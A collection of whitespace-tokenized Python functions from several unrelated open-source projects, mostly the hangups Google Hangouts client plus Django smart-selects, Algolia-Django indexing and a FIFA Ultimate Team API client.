def media ( self ) : media = super ( JqueryMediaMixin , self ) . media js = [ ] if JQUERY_URL : js . append ( JQUERY_URL ) elif JQUERY_URL is not False : vendor = '' if django . VERSION < ( 1 , 9 , 0 ) else 'vendor/jquery/' extra = '' if settings . DEBUG else '.min' jquery_paths = [ '{}jquery{}.js' . format ( vendor , extra ) , 'jquery.init.js' , ] if USE_DJANGO_JQUERY : jquery_paths = [ 'admin/js/{}' . format ( path ) for path in jquery_paths ] js . extend ( jquery_paths ) media += Media ( js = js ) return media
def media ( self ) : media = super ( ChainedSelect , self ) . media js = [ 'smart-selects/admin/js/chainedfk.js' , 'smart-selects/admin/js/bindfields.js' ] media += Media ( js = js ) return media
def _get_available_choices ( self , queryset , value ) : item = queryset . filter ( pk = value ) . first ( ) if item : try : pk = getattr ( item , self . chained_model_field + "_id" ) filter = { self . chained_model_field : pk } except AttributeError : try : # maybe m2m? pks = getattr ( item , self . chained_model_field ) . all ( ) . values_list ( 'pk' , flat = True ) filter = { self . chained_model_field + "__in" : pks } except AttributeError : try : # maybe a set? pks = getattr ( item , self . chained_model_field + "_set" ) . all ( ) . values_list ( 'pk' , flat = True ) filter = { self . chained_model_field + "__in" : pks } except AttributeError : # give up filter = { } filtered = list ( get_model ( self . to_app_name , self . to_model_name ) . objects . filter ( * * filter ) . distinct ( ) ) if self . sort : sort_results ( filtered ) else : # invalid value for queryset filtered = [ ] return filtered
def media ( self ) : media = super ( ChainedSelectMultiple , self ) . media js = [ 'smart-selects/admin/js/chainedm2m.js' , 'smart-selects/admin/js/bindfields.js' ] if self . horizontal : # For horizontal mode add django filter horizontal javascript code js . extend ( [ "admin/js/core.js" , "admin/js/SelectBox.js" , "admin/js/SelectFilter2.js" ] ) media += Media ( js = js ) return media
def _should_really_index ( self , instance ) : if self . _should_index_is_method : is_method = inspect . ismethod ( self . should_index ) try : count_args = len ( inspect . signature ( self . should_index ) . parameters ) except AttributeError : # noinspection PyDeprecation count_args = len ( inspect . getargspec ( self . should_index ) . args ) if is_method or count_args is 1 : # bound method, call with instance return self . should_index ( instance ) else : # unbound method, simply call without arguments return self . should_index ( ) else : # property/attribute/Field, evaluate as bool attr_type = type ( self . should_index ) if attr_type is DeferredAttribute : attr_value = self . should_index . __get__ ( instance , None ) elif attr_type is str : attr_value = getattr ( instance , self . should_index ) elif attr_type is property : attr_value = self . should_index . __get__ ( instance ) else : raise AlgoliaIndexError ( '{} should be a boolean attribute or a method that returns a boolean.' . format ( self . should_index ) ) if type ( attr_value ) is not bool : raise AlgoliaIndexError ( "%s's should_index (%s) should be a boolean" % ( instance . __class__ . __name__ , self . should_index ) ) return attr_value
def delete_record ( self , instance ) : objectID = self . objectID ( instance ) try : self . __index . delete_object ( objectID ) logger . info ( 'DELETE %s FROM %s' , objectID , self . model ) except AlgoliaException as e : if DEBUG : raise e else : logger . warning ( '%s FROM %s NOT DELETED: %s' , objectID , self . model , e )
def raw_search ( self , query = '' , params = None ) : if params is None : params = { } try : return self . __index . search ( query , params ) except AlgoliaException as e : if DEBUG : raise e else : logger . warning ( 'ERROR DURING SEARCH ON %s: %s' , self . index_name , e )
def get_settings ( self ) : try : logger . info ( 'GET SETTINGS ON %s' , self . index_name ) return self . __index . get_settings ( ) except AlgoliaException as e : if DEBUG : raise e else : logger . warning ( 'ERROR DURING GET_SETTINGS ON %s: %s' , self . model , e )
def set_settings ( self ) : if not self . settings : return try : self . __index . set_settings ( self . settings ) logger . info ( 'APPLY SETTINGS ON %s' , self . index_name ) except AlgoliaException as e : if DEBUG : raise e else : logger . warning ( 'SETTINGS NOT APPLIED ON %s: %s' , self . model , e )
def handle ( self , * args , * * options ) : self . stdout . write ( 'Apply settings to index:' ) for model in get_registered_model ( ) : if options . get ( 'model' , None ) and not ( model . __name__ in options [ 'model' ] ) : continue get_adapter ( model ) . set_settings ( ) self . stdout . write ( '\t* {}' . format ( model . __name__ ) )
def get_adapter ( self , model ) : if not self . is_registered ( model ) : raise RegistrationError ( '{} is not registered with Algolia engine' . format ( model ) ) return self . __registered_models [ model ]
def delete_record ( self , instance ) : adapter = self . get_adapter_from_instance ( instance ) adapter . delete_record ( instance )
def raw_search ( self , model , query = '' , params = None ) : if params is None : params = { } adapter = self . get_adapter ( model ) return adapter . raw_search ( query , params )
def __post_save_receiver ( self , instance , * * kwargs ) : logger . debug ( 'RECEIVE post_save FOR %s' , instance . __class__ ) self . save_record ( instance , * * kwargs )
def __pre_delete_receiver ( self , instance , * * kwargs ) : logger . debug ( 'RECEIVE pre_delete FOR %s' , instance . __class__ ) self . delete_record ( instance )
def handle ( self , * args , * * options ) : batch_size = options . get ( 'batchsize' , None ) if not batch_size : # py34-django18: batchsize is set to None if the user don't set # the value, instead of not be present in the dict batch_size = 1000 self . stdout . write ( 'The following models were reindexed:' ) for model in get_registered_model ( ) : if options . get ( 'model' , None ) and not ( model . __name__ in options [ 'model' ] ) : continue counts = reindex_all ( model , batch_size = batch_size ) self . stdout . write ( '\t* {} --> {}' . format ( model . __name__ , counts ) )
def handle ( self , * args , * * options ) : self . stdout . write ( 'Clear index:' ) for model in get_registered_model ( ) : if options . get ( 'model' , None ) and not ( model . __name__ in options [ 'model' ] ) : continue clear_index ( model ) self . stdout . write ( '\t* {}' . format ( model . __name__ ) )
def pad_cells ( table ) : col_sizes = [ max ( map ( len , col ) ) for col in zip ( * table ) ] for row in table : for cell_num , cell in enumerate ( row ) : row [ cell_num ] = pad_to ( cell , col_sizes [ cell_num ] ) return table
def add_dividers ( row , divider , padding ) : div = '' . join ( [ padding * ' ' , divider , padding * ' ' ] ) return div . join ( row )
def clubStaff ( self ) : method = 'GET' url = 'club/stats/staff' rc = self . __request__ ( method , url ) return rc
def clubConsumables ( self , fast = False ) : method = 'GET' url = 'club/consumables/development' rc = self . __request__ ( method , url ) events = [ self . pin . event ( 'page_view' , 'Hub - Club' ) ] self . pin . send ( events , fast = fast ) events = [ self . pin . event ( 'page_view' , 'Club - Consumables' ) ] self . pin . send ( events , fast = fast ) events = [ self . pin . event ( 'page_view' , 'Club - Consumables - List View' ) ] self . pin . send ( events , fast = fast ) return [ itemParse ( i ) for i in rc . get ( 'itemData' , ( ) ) ]
def tradepile ( self ) : method = 'GET' url = 'tradepile' rc = self . __request__ ( method , url ) # pinEvents events = [ self . pin . event ( 'page_view' , 'Hub - Transfers' ) , self . pin . event ( 'page_view' , 'Transfer List - List View' ) ] if rc . get ( 'auctionInfo' ) : events . append ( self . pin . event ( 'page_view' , 'Item - Detail View' ) ) self . pin . send ( events ) return [ itemParse ( i ) for i in rc . get ( 'auctionInfo' , ( ) ) ]
def sendToSbs ( self , challenge_id , item_id ) : # TODO?: multiple item_ids method = 'PUT' url = 'sbs/challenge/%s/squad' % challenge_id squad = self . sbsSquad ( challenge_id ) players = [ ] moved = False n = 0 for i in squad [ 'squad' ] [ 'players' ] : if i [ 'itemData' ] [ 'id' ] == item_id : # item already in sbs  # TODO?: report reason return False if i [ 'itemData' ] [ 'id' ] == 0 and not moved : i [ 'itemData' ] [ 'id' ] = item_id moved = True players . append ( { "index" : n , "itemData" : { "id" : i [ 'itemData' ] [ 'id' ] , "dream" : False } } ) n += 1 data = { 'players' : players } if not moved : return False else : self . __request__ ( method , url , data = json . dumps ( data ) ) return True
def messages ( self ) : method = 'GET' url = 'activeMessage' rc = self . __request__ ( method , url ) # try: #     return rc['activeMessage'] # except: #     raise UnknownError('Invalid activeMessage response')  # is it even possible? return rc [ 'activeMessage' ]
def num2hex ( self , num ) : temp = '' for i in range ( 0 , 4 ) : x = self . hexChars [ ( num >> ( i * 8 + 4 ) ) & 0x0F ] y = self . hexChars [ ( num >> ( i * 8 ) ) & 0x0F ] temp += ( x + y ) return temp
def logger ( name = None , save = False ) : logger = logging . getLogger ( name ) if save : logformat = '%(asctime)s [%(levelname)s] [%(name)s] %(funcName)s: %(message)s (line %(lineno)d)' log_file_path = 'fut.log' # TODO: define logpath open ( log_file_path , 'w' ) . write ( '' ) # remove old logs logger . setLevel ( logging . DEBUG ) logger_handler = logging . FileHandler ( log_file_path ) logger_handler . setFormatter ( logging . Formatter ( logformat ) ) else : logger_handler = NullHandler ( ) logger . addHandler ( logger_handler ) return logger
def _destroy_image_acquirer ( self , ia ) : id_ = None if ia . device : # ia . stop_image_acquisition ( ) # ia . _release_data_streams ( ) # id_ = ia . _device . id_ # if ia . device . node_map : # if ia . _chunk_adapter : ia . _chunk_adapter . detach_buffer ( ) ia . _chunk_adapter = None self . _logger . info ( 'Detached a buffer from the chunk adapter of {0}.' . format ( id_ ) ) ia . device . node_map . disconnect ( ) self . _logger . info ( 'Disconnected the port from the NodeMap of {0}.' . format ( id_ ) ) # if ia . _device . is_open ( ) : ia . _device . close ( ) self . _logger . info ( 'Closed Device module, {0}.' . format ( id_ ) ) ia . _device = None # if id_ : self . _logger . info ( 'Destroyed the ImageAcquirer object which {0} ' 'had belonged to.' . format ( id_ ) ) else : self . _logger . info ( 'Destroyed an ImageAcquirer.' ) if self . _profiler : self . _profiler . print_diff ( ) self . _ias . remove ( ia )
def Watson ( T , Hvap_ref , T_Ref , Tc , exponent = 0.38 ) : Tr = T / Tc Trefr = T_Ref / Tc H2 = Hvap_ref * ( ( 1 - Tr ) / ( 1 - Trefr ) ) ** exponent return H2
async def _on_receive_array ( self , array ) : if array [ 0 ] == 'noop' : pass # This is just a keep-alive, ignore it. else : wrapper = json . loads ( array [ 0 ] [ 'p' ] ) # Wrapper appears to be a Protocol Buffer message, but encoded via # field numbers as dictionary keys. Since we don't have a parser # for that, parse it ad-hoc here. if '3' in wrapper : # This is a new client_id. self . _client_id = wrapper [ '3' ] [ '2' ] logger . info ( 'Received new client_id: %r' , self . _client_id ) # Once client_id is received, the channel is ready to have # services added. await self . _add_channel_services ( ) if '2' in wrapper : pblite_message = json . loads ( wrapper [ '2' ] [ '2' ] ) if pblite_message [ 0 ] == 'cbu' : # This is a (Client)BatchUpdate containing StateUpdate # messages. batch_update = hangouts_pb2 . BatchUpdate ( ) pblite . decode ( batch_update , pblite_message , ignore_first_item = True ) for state_update in batch_update . state_update : logger . debug ( 'Received StateUpdate:\n%s' , state_update ) header = state_update . state_update_header self . _active_client_state = header . active_client_state await self . on_state_update . fire ( state_update ) else : logger . info ( 'Ignoring message: %r' , pblite_message [ 0 ] )
async def add_user ( self , add_user_request ) : response = hangouts_pb2 . AddUserResponse ( ) await self . _pb_request ( 'conversations/adduser' , add_user_request , response ) return response
async def create_conversation ( self , create_conversation_request ) : response = hangouts_pb2 . CreateConversationResponse ( ) await self . _pb_request ( 'conversations/createconversation' , create_conversation_request , response ) return response
async def easter_egg ( self , easter_egg_request ) : response = hangouts_pb2 . EasterEggResponse ( ) await self . _pb_request ( 'conversations/easteregg' , easter_egg_request , response ) return response
async def get_conversation ( self , get_conversation_request ) : response = hangouts_pb2 . GetConversationResponse ( ) await self . _pb_request ( 'conversations/getconversation' , get_conversation_request , response ) return response
async def get_group_conversation_url ( self , get_group_conversation_url_request ) : response = hangouts_pb2 . GetGroupConversationUrlResponse ( ) await self . _pb_request ( 'conversations/getgroupconversationurl' , get_group_conversation_url_request , response ) return response
async def get_self_info ( self , get_self_info_request ) : response = hangouts_pb2 . GetSelfInfoResponse ( ) await self . _pb_request ( 'contacts/getselfinfo' , get_self_info_request , response ) return response
async def get_suggested_entities ( self , get_suggested_entities_request ) : response = hangouts_pb2 . GetSuggestedEntitiesResponse ( ) await self . _pb_request ( 'contacts/getsuggestedentities' , get_suggested_entities_request , response ) return response
async def query_presence ( self , query_presence_request ) : response = hangouts_pb2 . QueryPresenceResponse ( ) await self . _pb_request ( 'presence/querypresence' , query_presence_request , response ) return response
async def remove_user ( self , remove_user_request ) : response = hangouts_pb2 . RemoveUserResponse ( ) await self . _pb_request ( 'conversations/removeuser' , remove_user_request , response ) return response
async def search_entities ( self , search_entities_request ) : response = hangouts_pb2 . SearchEntitiesResponse ( ) await self . _pb_request ( 'contacts/searchentities' , search_entities_request , response ) return response
async def send_chat_message ( self , send_chat_message_request ) : response = hangouts_pb2 . SendChatMessageResponse ( ) await self . _pb_request ( 'conversations/sendchatmessage' , send_chat_message_request , response ) return response
async def modify_otr_status ( self , modify_otr_status_request ) : response = hangouts_pb2 . ModifyOTRStatusResponse ( ) await self . _pb_request ( 'conversations/modifyotrstatus' , modify_otr_status_request , response ) return response
async def send_offnetwork_invitation ( self , send_offnetwork_invitation_request ) : response = hangouts_pb2 . SendOffnetworkInvitationResponse ( ) await self . _pb_request ( 'devices/sendoffnetworkinvitation' , send_offnetwork_invitation_request , response ) return response
async def set_active_client ( self , set_active_client_request ) : response = hangouts_pb2 . SetActiveClientResponse ( ) await self . _pb_request ( 'clients/setactiveclient' , set_active_client_request , response ) return response
async def set_conversation_notification_level ( self , set_conversation_notification_level_request ) : response = hangouts_pb2 . SetConversationNotificationLevelResponse ( ) await self . _pb_request ( 'conversations/setconversationnotificationlevel' , set_conversation_notification_level_request , response ) return response
async def set_focus ( self , set_focus_request ) : response = hangouts_pb2 . SetFocusResponse ( ) await self . _pb_request ( 'conversations/setfocus' , set_focus_request , response ) return response
async def set_group_link_sharing_enabled ( self , set_group_link_sharing_enabled_request ) : response = hangouts_pb2 . SetGroupLinkSharingEnabledResponse ( ) await self . _pb_request ( 'conversations/setgrouplinksharingenabled' , set_group_link_sharing_enabled_request , response ) return response
async def set_presence ( self , set_presence_request ) : response = hangouts_pb2 . SetPresenceResponse ( ) await self . _pb_request ( 'presence/setpresence' , set_presence_request , response ) return response
async def set_typing ( self , set_typing_request ) : response = hangouts_pb2 . SetTypingResponse ( ) await self . _pb_request ( 'conversations/settyping' , set_typing_request , response ) return response
async def sync_all_new_events ( self , sync_all_new_events_request ) : response = hangouts_pb2 . SyncAllNewEventsResponse ( ) await self . _pb_request ( 'conversations/syncallnewevents' , sync_all_new_events_request , response ) return response
async def sync_recent_conversations ( self , sync_recent_conversations_request ) : response = hangouts_pb2 . SyncRecentConversationsResponse ( ) await self . _pb_request ( 'conversations/syncrecentconversations' , sync_recent_conversations_request , response ) return response
def from_timestamp ( microsecond_timestamp ) : # Create datetime without losing precision from floating point (yes, this # is actually needed): return datetime . datetime . fromtimestamp ( microsecond_timestamp // 1000000 , datetime . timezone . utc ) . replace ( microsecond = ( microsecond_timestamp % 1000000 ) )
def from_participantid ( participant_id ) : return user . UserID ( chat_id = participant_id . chat_id , gaia_id = participant_id . gaia_id )
def to_participantid ( user_id ) : return hangouts_pb2 . ParticipantId ( chat_id = user_id . chat_id , gaia_id = user_id . gaia_id )
def parse_watermark_notification ( p ) : return WatermarkNotification ( conv_id = p . conversation_id . id , user_id = from_participantid ( p . sender_id ) , read_timestamp = from_timestamp ( p . latest_read_timestamp ) , )
def _get_authorization_headers ( sapisid_cookie ) : # It doesn't seem to matter what the url and time are as long as they are # consistent. time_msec = int ( time . time ( ) * 1000 ) auth_string = '{} {} {}' . format ( time_msec , sapisid_cookie , ORIGIN_URL ) auth_hash = hashlib . sha1 ( auth_string . encode ( ) ) . hexdigest ( ) sapisidhash = 'SAPISIDHASH {}_{}' . format ( time_msec , auth_hash ) return { 'authorization' : sapisidhash , 'x-origin' : ORIGIN_URL , 'x-goog-authuser' : '0' , }
async def lookup_entities ( client , args ) : lookup_spec = _get_lookup_spec ( args . entity_identifier ) request = hangups . hangouts_pb2 . GetEntityByIdRequest ( request_header = client . get_request_header ( ) , batch_lookup_spec = [ lookup_spec ] , ) res = await client . get_entity_by_id ( request ) # Print the list of entities in the response. for entity_result in res . entity_result : for entity in entity_result . entity : print ( entity )
def _get_lookup_spec ( identifier ) : if identifier . startswith ( '+' ) : return hangups . hangouts_pb2 . EntityLookupSpec ( phone = identifier , create_offnetwork_gaia = True ) elif '@' in identifier : return hangups . hangouts_pb2 . EntityLookupSpec ( email = identifier , create_offnetwork_gaia = True ) else : return hangups . hangouts_pb2 . EntityLookupSpec ( gaia_id = identifier )
def add_color_to_scheme ( scheme , name , foreground , background , palette_colors ) : if foreground is None and background is None : return scheme new_scheme = [ ] for item in scheme : if item [ 0 ] == name : if foreground is None : foreground = item [ 1 ] if background is None : background = item [ 2 ] if palette_colors > 16 : new_scheme . append ( ( name , '' , '' , '' , foreground , background ) ) else : new_scheme . append ( ( name , foreground , background ) ) else : new_scheme . append ( item ) return new_scheme
def is_quiet ( self ) : level = self . _conversation . self_conversation_state . notification_level return level == hangouts_pb2 . NOTIFICATION_LEVEL_QUIET
def _on_watermark_notification ( self , notif ) : # Update the conversation: if self . get_user ( notif . user_id ) . is_self : logger . info ( 'latest_read_timestamp for {} updated to {}' . format ( self . id_ , notif . read_timestamp ) ) self_conversation_state = ( self . _conversation . self_conversation_state ) self_conversation_state . self_read_state . latest_read_timestamp = ( parsers . to_timestamp ( notif . read_timestamp ) ) # Update the participants' watermarks: previous_timestamp = self . _watermarks . get ( notif . user_id , datetime . datetime . min . replace ( tzinfo = datetime . timezone . utc ) ) if notif . read_timestamp > previous_timestamp : logger . info ( ( 'latest_read_timestamp for conv {} participant {}' + ' updated to {}' ) . format ( self . id_ , notif . user_id . chat_id , notif . read_timestamp ) ) self . _watermarks [ notif . user_id ] = notif . read_timestamp
def _wrap_event ( event_ ) : cls = conversation_event . ConversationEvent if event_ . HasField ( 'chat_message' ) : cls = conversation_event . ChatMessageEvent elif event_ . HasField ( 'otr_modification' ) : cls = conversation_event . OTREvent elif event_ . HasField ( 'conversation_rename' ) : cls = conversation_event . RenameEvent elif event_ . HasField ( 'membership_change' ) : cls = conversation_event . MembershipChangeEvent elif event_ . HasField ( 'hangout_event' ) : cls = conversation_event . HangoutEvent elif event_ . HasField ( 'group_link_sharing_modification' ) : cls = conversation_event . GroupLinkSharingModificationEvent return cls ( event_ )
def _get_event_request_header ( self ) : otr_status = ( hangouts_pb2 . OFF_THE_RECORD_STATUS_OFF_THE_RECORD if self . is_off_the_record else hangouts_pb2 . OFF_THE_RECORD_STATUS_ON_THE_RECORD ) return hangouts_pb2 . EventRequestHeader ( conversation_id = hangouts_pb2 . ConversationId ( id = self . id_ ) , client_generated_id = self . _client . get_client_generated_id ( ) , expected_otr = otr_status , delivery_medium = self . _get_default_delivery_medium ( ) , )
def _add_conversation ( self , conversation , events = [ ] , event_cont_token = None ) : # pylint: disable=dangerous-default-value conv_id = conversation . conversation_id . id logger . debug ( 'Adding new conversation: {}' . format ( conv_id ) ) conv = Conversation ( self . _client , self . _user_list , conversation , events , event_cont_token ) self . _conv_dict [ conv_id ] = conv return conv
async def _sync ( self ) : logger . info ( 'Syncing events since {}' . format ( self . _sync_timestamp ) ) try : res = await self . _client . sync_all_new_events ( hangouts_pb2 . SyncAllNewEventsRequest ( request_header = self . _client . get_request_header ( ) , last_sync_timestamp = parsers . to_timestamp ( self . _sync_timestamp ) , max_response_size_bytes = 1048576 , # 1 MB ) ) except exceptions . NetworkError as e : logger . warning ( 'Failed to sync events, some events may be lost: {}' . format ( e ) ) else : for conv_state in res . conversation_state : conv_id = conv_state . conversation_id . id conv = self . _conv_dict . get ( conv_id , None ) if conv is not None : conv . update_conversation ( conv_state . conversation ) for event_ in conv_state . event : timestamp = parsers . from_timestamp ( event_ . timestamp ) if timestamp > self . _sync_timestamp : # This updates the sync_timestamp for us, as well # as triggering events. await self . _on_event ( event_ ) else : self . _add_conversation ( conv_state . conversation , conv_state . event , conv_state . event_continuation_token )
def _add_user_from_conv_part ( self , conv_part ) : user_ = User . from_conv_part_data ( conv_part , self . _self_user . id_ ) existing = self . _user_dict . get ( user_ . id_ ) if existing is None : logger . warning ( 'Adding fallback User with %s name "%s"' , user_ . name_type . name . lower ( ) , user_ . full_name ) self . _user_dict [ user_ . id_ ] = user_ return user_ else : existing . upgrade_name ( user_ ) return existing
async def fire ( self , * args , * * kwargs ) : logger . debug ( 'Fired {}' . format ( self ) ) for observer in self . _observers : gen = observer ( * args , * * kwargs ) if asyncio . iscoroutinefunction ( observer ) : await gen
def markdown ( tag ) : return ( MARKDOWN_START . format ( tag = tag ) , MARKDOWN_END . format ( tag = tag ) )
def html ( tag ) : return ( HTML_START . format ( tag = tag ) , HTML_END . format ( tag = tag ) )
def _get_parser ( extra_args ) : parser = argparse . ArgumentParser ( formatter_class = argparse . ArgumentDefaultsHelpFormatter , ) dirs = appdirs . AppDirs ( 'hangups' , 'hangups' ) default_token_path = os . path . join ( dirs . user_cache_dir , 'refresh_token.txt' ) parser . add_argument ( '--token-path' , default = default_token_path , help = 'path used to store OAuth refresh token' ) parser . add_argument ( '-d' , '--debug' , action = 'store_true' , help = 'log detailed debugging messages' ) for extra_arg in extra_args : parser . add_argument ( extra_arg , required = True ) return parser
async def _async_main ( example_coroutine , client , args ) : # Spawn a task for hangups to run in parallel with the example coroutine. task = asyncio . ensure_future ( client . connect ( ) ) # Wait for hangups to either finish connecting or raise an exception. on_connect = asyncio . Future ( ) client . on_connect . add_observer ( lambda : on_connect . set_result ( None ) ) done , _ = await asyncio . wait ( ( on_connect , task ) , return_when = asyncio . FIRST_COMPLETED ) await asyncio . gather ( * done ) # Run the example coroutine. Afterwards, disconnect hangups gracefully and # yield the hangups task to handle any exceptions. try : await example_coroutine ( client , args ) except asyncio . CancelledError : pass finally : await client . disconnect ( ) await task
def main ( ) : parser = argparse . ArgumentParser ( ) parser . add_argument ( 'protofilepath' ) args = parser . parse_args ( ) out_file = compile_protofile ( args . protofilepath ) with open ( out_file , 'rb' ) as proto_file : # pylint: disable=no-member file_descriptor_set = descriptor_pb2 . FileDescriptorSet . FromString ( proto_file . read ( ) ) # pylint: enable=no-member for file_descriptor in file_descriptor_set . file : # Build dict of location tuples locations = { } for location in file_descriptor . source_code_info . location : locations [ tuple ( location . path ) ] = location # Add comment to top print ( make_comment ( 'This file was automatically generated from {} and ' 'should not be edited directly.' . format ( args . protofilepath ) ) ) # Generate documentation for index , message_desc in enumerate ( file_descriptor . message_type ) : generate_message_doc ( message_desc , locations , ( 4 , index ) ) for index , enum_desc in enumerate ( file_descriptor . enum_type ) : generate_enum_doc ( enum_desc , locations , ( 5 , index ) )
def dir_maker ( path ) : directory = os . path . dirname ( path ) if directory != '' and not os . path . isdir ( directory ) : try : os . makedirs ( directory ) except OSError as e : sys . exit ( 'Failed to create directory: {}' . format ( e ) )
def main ( ) : # Build default paths for files. dirs = appdirs . AppDirs ( 'hangups' , 'hangups' ) default_log_path = os . path . join ( dirs . user_log_dir , 'hangups.log' ) default_token_path = os . path . join ( dirs . user_cache_dir , 'refresh_token.txt' ) default_config_path = 'hangups.conf' user_config_path = os . path . join ( dirs . user_config_dir , 'hangups.conf' ) # Create a default empty config file if does not exist. dir_maker ( user_config_path ) if not os . path . isfile ( user_config_path ) : with open ( user_config_path , 'a' ) as cfg : cfg . write ( "" ) parser = configargparse . ArgumentParser ( prog = 'hangups' , default_config_files = [ default_config_path , user_config_path ] , formatter_class = configargparse . ArgumentDefaultsHelpFormatter , add_help = False , # Disable help so we can add it to the correct group. ) general_group = parser . add_argument_group ( 'General' ) general_group . add ( '-h' , '--help' , action = 'help' , help = 'show this help message and exit' ) general_group . add ( '--token-path' , default = default_token_path , help = 'path used to store OAuth refresh token' ) general_group . add ( '--date-format' , default = '< %y-%m-%d >' , help = 'date format string' ) general_group . add ( '--time-format' , default = '(%I:%M:%S %p)' , help = 'time format string' ) general_group . add ( '-c' , '--config' , help = 'configuration file path' , is_config_file = True , default = user_config_path ) general_group . add ( '-v' , '--version' , action = 'version' , version = 'hangups {}' . format ( hangups . __version__ ) ) general_group . add ( '-d' , '--debug' , action = 'store_true' , help = 'log detailed debugging messages' ) general_group . add ( '--manual-login' , action = 'store_true' , help = 'enable manual login method' ) general_group . add ( '--log' , default = default_log_path , help = 'log file path' ) key_group = parser . add_argument_group ( 'Keybindings' ) key_group . add ( '--key-next-tab' , default = 'ctrl d' , help = 'keybinding for next tab' ) key_group . add ( '--key-prev-tab' , default = 'ctrl u' , help = 'keybinding for previous tab' ) key_group . add ( '--key-close-tab' , default = 'ctrl w' , help = 'keybinding for close tab' ) key_group . add ( '--key-quit' , default = 'ctrl e' , help = 'keybinding for quitting' ) key_group . add ( '--key-menu' , default = 'ctrl n' , help = 'keybinding for context menu' ) key_group . add ( '--key-up' , default = 'k' , help = 'keybinding for alternate up key' ) key_group . add ( '--key-down' , default = 'j' , help = 'keybinding for alternate down key' ) key_group . add ( '--key-page-up' , default = 'ctrl b' , help = 'keybinding for alternate page up' ) key_group . add ( '--key-page-down' , default = 'ctrl f' , help = 'keybinding for alternate page down' ) notification_group = parser . add_argument_group ( 'Notifications' ) # deprecated in favor of --notification-type=none: notification_group . add ( '-n' , '--disable-notifications' , action = 'store_true' , help = configargparse . SUPPRESS ) notification_group . add ( '-D' , '--discreet-notifications' , action = 'store_true' , help = 'hide message details in notifications' ) notification_group . add ( '--notification-type' , choices = sorted ( NOTIFIER_TYPES . keys ( ) ) , default = 'default' , help = 'type of notifications to create' ) # add color scheme options col_group = parser . add_argument_group ( 'Colors' ) col_group . add ( '--col-scheme' , choices = COL_SCHEMES . keys ( ) , default = 'default' , help = 'colour scheme to use' ) col_group . add ( '--col-palette-colors' , choices = ( '16' , '88' , '256' ) , default = 16 , help = 'Amount of available colors' ) for name in COL_SCHEME_NAMES : col_group . add ( '--col-' + name . replace ( '_' , '-' ) + '-fg' , help = name + ' foreground color' ) col_group . add ( '--col-' + name . replace ( '_' , '-' ) + '-bg' , help = name + ' background color' ) args = parser . parse_args ( ) # Create all necessary directories. for path in [ args . log , args . token_path ] : dir_maker ( path ) logging . basicConfig ( filename = args . log , level = logging . DEBUG if args . debug else logging . WARNING , format = LOG_FORMAT ) # urwid makes asyncio's debugging logs VERY noisy, so adjust the log level: logging . getLogger ( 'asyncio' ) . setLevel ( logging . WARNING ) datetimefmt = { 'date' : args . date_format , 'time' : args . time_format } # setup color scheme palette_colors = int ( args . col_palette_colors ) col_scheme = COL_SCHEMES [ args . col_scheme ] for name in COL_SCHEME_NAMES : col_scheme = add_color_to_scheme ( col_scheme , name , getattr ( args , 'col_' + name + '_fg' ) , getattr ( args , 'col_' + name + '_bg' ) , palette_colors ) keybindings = { 'next_tab' : args . key_next_tab , 'prev_tab' : args . key_prev_tab , 'close_tab' : args . key_close_tab , 'quit' : args . key_quit , 'menu' : args . key_menu , 'up' : args . key_up , 'down' : args . key_down , 'page_up' : args . key_page_up , 'page_down' : args . key_page_down , } notifier_ = get_notifier ( args . notification_type , args . disable_notifications ) try : ChatUI ( args . token_path , keybindings , col_scheme , palette_colors , datetimefmt , notifier_ , args . discreet_notifications , args . manual_login ) except KeyboardInterrupt : sys . exit ( 'Caught KeyboardInterrupt, exiting abnormally' )
def _exception_handler ( self , _loop , context ) : # Start a graceful shutdown. self . _coroutine_queue . put ( self . _client . disconnect ( ) ) # Store the exception to be re-raised later. If the context doesn't # contain an exception, create one containing the error message. default_exception = Exception ( context . get ( 'message' ) ) self . _exception = context . get ( 'exception' , default_exception )
def _input_filter ( self , keys , _ ) : if keys == [ self . _keys [ 'menu' ] ] : if self . _urwid_loop . widget == self . _tabbed_window : self . _show_menu ( ) else : self . _hide_menu ( ) elif keys == [ self . _keys [ 'quit' ] ] : self . _coroutine_queue . put ( self . _client . disconnect ( ) ) else : return keys
def _show_menu ( self ) : # If the current widget in the TabbedWindowWidget has a menu, # overlay it on the TabbedWindowWidget. current_widget = self . _tabbed_window . get_current_widget ( ) if hasattr ( current_widget , 'get_menu_widget' ) : menu_widget = current_widget . get_menu_widget ( self . _hide_menu ) overlay = urwid . Overlay ( menu_widget , self . _tabbed_window , align = 'center' , width = ( 'relative' , 80 ) , valign = 'middle' , height = ( 'relative' , 80 ) ) self . _urwid_loop . widget = overlay
def get_conv_widget ( self , conv_id ) : if conv_id not in self . _conv_widgets : set_title_cb = ( lambda widget , title : self . _tabbed_window . set_tab ( widget , title = title ) ) widget = ConversationWidget ( self . _client , self . _coroutine_queue , self . _conv_list . get ( conv_id ) , set_title_cb , self . _keys , self . _datetimefmt ) self . _conv_widgets [ conv_id ] = widget return self . _conv_widgets [ conv_id ]
def add_conversation_tab ( self , conv_id , switch = False ) : conv_widget = self . get_conv_widget ( conv_id ) self . _tabbed_window . set_tab ( conv_widget , switch = switch , title = conv_widget . title )
async def _on_connect ( self ) : self . _user_list , self . _conv_list = ( await hangups . build_user_conversation_list ( self . _client ) ) self . _conv_list . on_event . add_observer ( self . _on_event ) # show the conversation menu conv_picker = ConversationPickerWidget ( self . _conv_list , self . on_select_conversation , self . _keys ) self . _tabbed_window = TabbedWindowWidget ( self . _keys ) self . _tabbed_window . set_tab ( conv_picker , switch = True , title = 'Conversations' ) self . _urwid_loop . widget = self . _tabbed_window
def _on_event ( self , conv_event ) : conv = self . _conv_list . get ( conv_event . conversation_id ) user = conv . get_user ( conv_event . user_id ) show_notification = all ( ( isinstance ( conv_event , hangups . ChatMessageEvent ) , not user . is_self , not conv . is_quiet , ) ) if show_notification : self . add_conversation_tab ( conv_event . conversation_id ) if self . _discreet_notifications : notification = DISCREET_NOTIFICATION else : notification = notifier . Notification ( user . full_name , get_conv_name ( conv ) , conv_event . text ) self . _notifier . send ( notification )
def put ( self , coro ) : # Avoid logging when a coroutine is queued or executed to avoid log # spam from coroutines that are started on every keypress. assert asyncio . iscoroutine ( coro ) self . _queue . put_nowait ( coro )
async def consume ( self ) : while True : coro = await self . _queue . get ( ) assert asyncio . iscoroutine ( coro ) await coro
def _rename ( self , name , callback ) : self . _coroutine_queue . put ( self . _conversation . rename ( name ) ) callback ( )
def _on_event ( self , _ ) : # TODO: handle adding new conversations self . sort ( key = lambda conv_button : conv_button . last_modified , reverse = True )
